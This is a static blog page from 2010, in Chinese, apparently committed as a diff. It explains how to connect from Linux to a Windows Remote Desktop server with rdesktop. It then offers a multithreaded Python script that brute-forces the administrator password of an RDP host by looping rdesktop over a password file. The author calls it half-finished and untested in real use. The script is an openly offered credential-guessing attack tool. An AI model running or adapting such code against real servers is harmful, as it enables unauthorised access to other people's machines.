@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="cn">
+<head>
+        
+        <title>大数据算命阁</title>
+        <meta charset="utf-8" />
+                <link href="http://www.renewjoy.org/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="大数据算命阁 Full Atom Feed" />
+                                                <link href="http://www.renewjoy.org/feeds/wan-yi.atom.xml" type="application/atom+xml" rel="alternate" title="大数据算命阁 Categories Atom Feed" />
+                                
+
+        <!-- Mobile viewport optimized: j.mp/bplateviewport -->
+        <meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1">
+
+        <link rel="stylesheet" type="text/css" href="http://www.renewjoy.org/theme/gumby.css" />
+        <link rel="stylesheet" type="text/css" href="http://www.renewjoy.org/theme/style.css" />
+
+        <script src="http://www.renewjoy.org/theme/js/libs/modernizr-2.6.2.min.js"></script>
+
+
+          
+
+
+
+        </head>
+
+<body id="index" class="home">
+
+
+    <div class="container">
+
+        <div class="row">
+
+          <header id="banner" class="body">
+                  <h1><a href="http://www.renewjoy.org">大数据算命阁 <strong></strong></a></h1>
+          </header><!-- /#banner -->
+
+            <div id="navigation" class="navbar row">
+              <a href="#" gumby-trigger="#navigation &gt; ul" class="toggle"><i class="icon-menu"></i></a>
+             
+              <ul class="columns">
+                <li><a href="http://www.renewjoy.org">Home</a></li>
+
+                                                  
+              </ul>
+            </div>
+
+          <section id="content" class="body">
+
+   <div class="row">
+        <div class="eleven columns">
+
+
+            <header>
+              <h2 class="entry-title">
+                <a href="http://www.renewjoy.org/linux-login-3389.html" rel="bookmark"
+                   title="Permalink to Linux下登录3389">Linux下登录3389</a></h2>
+                      
+            </header>
+            <footer class="post-info">
+              <abbr class="published" title="2010-07-05T16:45:00">
+                Mon 05 July 2010
+              </abbr>
+                            <address class="vcard author">
+                By <a class="url fn" href="http://www.renewjoy.org/author/renewjoy.html">renewjoy</a>
+              </address>
+                          </footer><!-- /.post-info -->
+            <div class="entry-content">
+              <p>黑色的夜里,用windows上未知服务器的3389怕中马,我们用Linux来登录.</p>
+<pre class="literal-block">
+# rdesktop -u administrator -p the_password -a 8 -r disk:haha=/root/Desktop/win_bin/ xx.yy.zz.aa
+-u 用户
+-p 密码
+-a 8 显示颜色位深,可选16, 24
+-r 映射本地目录到远程
+</pre>
+<p>haha为名称, /root/Desktop/win_bin/为本地路径.</p>
+<p>xx.yy.zz.aa 为远程ip</p>
+<p>附一个在Linux下破解3389口令的脚本,半成品. 必须要用户自己判断才行.</p>
+<p>本来网上说的都是rdesktop打上补丁就可以破解了,可是我打上补丁后,运行老是出错.没法,自己写个玩玩,虽然实战中没有成功过,估计以后改进后能用.</p>
+<p>程序说明:
+1. 使用了多线程.
+2. 调用了rdesktop工具, 所有参数按最节约带宽来写.
+3. 自己制作pass.txt文件.
+4. 成功登录后,rdesktop标题显示为Pass:[the_password]
+5. rdesktop打开的窗口不需要手动关闭,超时后会自动退出.</p>
+<div class="highlight"><pre><span class="c">#!/usr/bin/env python</span>
+<span class="c">#-*- coding:utf-8 -*-</span>
+
+<span class="kn">import</span> <span class="nn">os</span><span class="o">,</span><span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">Queue</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+
+<span class="n">ip</span> <span class="o">=</span> <span class="s">&quot;192.168.1.104&quot;</span>
+<span class="n">pass_file</span> <span class="o">=</span> <span class="s">&quot;pass.txt&quot;</span>
+<span class="n">thread_max</span> <span class="o">=</span> <span class="mi">20</span>
+
+<span class="n">passwords</span> <span class="o">=</span> <span class="n">Queue</span><span class="o">.</span><span class="n">Queue</span><span class="p">()</span>
+
+<span class="k">class</span> <span class="nc">RDP</span><span class="p">(</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">):</span>
+        <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">passwords</span><span class="p">):</span>
+                <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="o">.</span><span class="n">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
+                <span class="bp">self</span><span class="o">.</span><span class="n">passwords</span> <span class="o">=</span> <span class="n">passwords</span>
+
+        <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+                <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+                        <span class="n">pwd</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">passwords</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
+                        <span class="k">print</span> <span class="s">&#39;Current PASS: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">pwd</span><span class="p">,</span> <span class="p">)</span>
+                        <span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;&quot;&quot;rdesktop -m -g 480x320 -u administrator -p </span><span class="si">%s</span><span class="s"> -k en-us -a 8 -T &#39;Pass:[</span><span class="si">%s</span><span class="s">]&#39; </span><span class="si">%s</span><span class="s">&quot;&quot;&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">pwd</span><span class="p">,</span> <span class="n">pwd</span><span class="p">,</span> <span class="n">ip</span><span class="p">)</span>
+                        <span class="n">res</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+                        <span class="k">print</span> <span class="n">res</span>
+                        <span class="c">#             if res == 0:</span>
+                        <span class="c">#                 sys.exit()</span>
+                <span class="bp">self</span><span class="o">.</span><span class="n">passwords</span><span class="o">.</span><span class="n">task_done</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">thread_max</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
+                <span class="n">rdp</span> <span class="o">=</span> <span class="n">RDP</span><span class="p">(</span><span class="n">passwords</span><span class="p">)</span>
+                <span class="c">#        rdp.setDaemon(True)</span>
+                <span class="n">rdp</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+        <span class="k">for</span> <span class="n">pwd</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="n">pass_file</span><span class="p">):</span>
+                <span class="n">passwords</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">pwd</span><span class="o">.</span><span class="n">rstrip</span><span class="p">())</span>
+
+<span class="c">#    passwords.join()</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+        <span class="n">main</span><span class="p">()</span>
+</pre></div>
+
+            </div><!-- /.entry-content -->
+
+
+        </div><!-- /.eleven.columns -->
+        
+     <div class="three columns">
+
+<h4>Pages</h4>
+
+ <ul>
+            </ul>
+
+<h4>Categories</h4>
+<ul>
+			<li><a href="http://www.renewjoy.org/category/xin-qing-bo-ke.html">心情博客</a></li>
+			<li><a href="http://www.renewjoy.org/category/xin-qing-ji-lu.html">心情记录</a></li>
+			<li><a href="http://www.renewjoy.org/category/wan-yi.html">玩意</a></li>
+			<li><a href="http://www.renewjoy.org/category/shi-qing-hua-yi.html">诗情画意</a></li>
+			<li><a href="http://www.renewjoy.org/category/shi-ci.html">诗词</a></li>
+	</ul>
+
+
+<h4>Tags</h4>
+	<ul>
+		    <li class="tag-4"><a href="http://www.renewjoy.org/tag/善恶.html">善恶</a></li>
+		    <li class="tag-4"><a href="http://www.renewjoy.org/tag/功过.html">功过</a></li>
+		    <li class="tag-4"><a href="http://www.renewjoy.org/tag/因果.html">因果</a></li>
+		    <li class="tag-1"><a href="http://www.renewjoy.org/tag/clover.html">clover</a></li>
+		    <li class="tag-4"><a href="http://www.renewjoy.org/tag/姑苏.html">姑苏</a></li>
+		    <li class="tag-1"><a href="http://www.renewjoy.org/tag/crack.html">crack</a></li>
+		    <li class="tag-4"><a href="http://www.renewjoy.org/tag/青城山.html">青城山</a></li>
+		    <li class="tag-1"><a href="http://www.renewjoy.org/tag/wireless.html">wireless</a></li>
+		    <li class="tag-4"><a href="http://www.renewjoy.org/tag/失明.html">失明</a></li>
+		    <li class="tag-4"><a href="http://www.renewjoy.org/tag/仓央嘉措.html">仓央嘉措</a></li>
+		    <li class="tag-4"><a href="http://www.renewjoy.org/tag/佛.html">佛</a></li>
+	</ul>
+
+
+<nav class="widget">
+  <h4>Social</h4>
+  <ul>
+      <li><a href="微博">http://t.qq.com/oyea9le</a></li>
+      <li><a href="Another social link">#</a></li>
+    </ul>
+</nav>
+
+</div> </div><!-- /.row -->
+
+
+</section>
+
+       </div><!-- /.row -->
+    </div><!-- /.container -->
+
+
+       <div class="container.nopad bg">
+
+    
+        <footer id="credits" class="row">
+          <div class="seven columns left-center">
+
+                   <address id="about" class="vcard body">
+                    Proudly powered by <a href="http://getpelican.com/">Pelican</a>,
+                    which takes great advantage of <a href="http://python.org">Python</a>.
+                    <br />
+                    Based on the <a target="_blank" href="http://gumbyframework.com">Gumby Framework</a>
+                    </address>
+          </div>
+
+
+          <div class="seven columns">
+            <div class="row">
+              <ul class="socbtns">
+
+                
+                
+                
+                
+              </ul>
+            </div>
+          </div>
+        </footer>
+
+    </div>
+
+
+  <script src="http://www.renewjoy.org/theme/js/libs/jquery-1.9.1.min.js"></script>
+  <script src="http://www.renewjoy.org/theme/js/libs/gumby.min.js"></script>
+  <script src="http://www.renewjoy.org/theme/js/plugins.js"></script>
+
+</body>
+</html>
